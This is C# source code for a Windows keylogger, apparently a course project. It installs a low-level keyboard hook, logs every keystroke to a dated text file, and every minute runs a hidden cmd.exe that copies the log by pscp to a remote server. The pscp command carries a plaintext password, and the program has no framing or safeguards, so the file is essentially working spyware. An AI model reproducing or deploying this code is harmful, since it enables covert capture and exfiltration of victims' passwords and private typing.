using System;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;
using System.Threading;

class InterceptKeys
{
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    private static LowLevelKeyboardProc _proc = HookCallback;
    private static IntPtr _hookID = IntPtr.Zero;
    private static string fileName = "log_";

    public static void Main()
    {
        fileName = fileName + DateTime.Today.Month + "_" + DateTime.Today.Day + ".txt";
        Thread workerThread = new Thread(copyFileToServer);
        workerThread.Start();
        _hookID = SetHook(_proc);
        Application.Run();
        UnhookWindowsHookEx(_hookID);
    }

    private static IntPtr SetHook(LowLevelKeyboardProc proc)
    {
        using (Process curProcess = Process.GetCurrentProcess())
        using (ProcessModule curModule = curProcess.MainModule)
        {
            return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                GetModuleHandle(curModule.ModuleName), 0);
        }
    }

    private delegate IntPtr LowLevelKeyboardProc(
        int nCode, IntPtr wParam, IntPtr lParam);

    private static IntPtr HookCallback( int nCode, IntPtr wParam, IntPtr lParam)
    {
        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
        {
            int vkCode = Marshal.ReadInt32(lParam);
            Console.WriteLine((Keys)vkCode);

            char key = Convert.ToChar(vkCode);
            writeToFile((Keys)vkCode);
        }
        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }

    private static void writeToFile(Keys p)
    { 
        char key = Convert.ToChar(p);
        if (key == 32)
            key = ' ';
        else if (key == 13)
            key = '\n';

        //if (key > 31 && key < 126)
        //{
            using (StreamWriter writer = new StreamWriter(fileName, true))
            {
                writer.Write(key.ToString());
            }
        //}
    }

    private static void copyFileToServer()
    {
        while (true)
        {
            Thread.Sleep(60000); // do only once every 60 seconds
            System.Diagnostics.Process process = new System.Diagnostics.Process();
            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
            startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            startInfo.FileName = "cmd.exe";
            startInfo.Arguments = "/C" + AppDomain.CurrentDomain.BaseDirectory + "pscp -pw kglosseCSET3100 -batch -q -scp " + AppDomain.CurrentDomain.BaseDirectory + fileName + " kglosse@et791.ni.utoledo.edu:cset4850/logs/" + fileName;
            process.StartInfo = startInfo;
            try
            {
                process.Start();
            }
            catch (Exception e)
            {
                continue;
            }
        }
    }

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook,
        LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
        IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);
}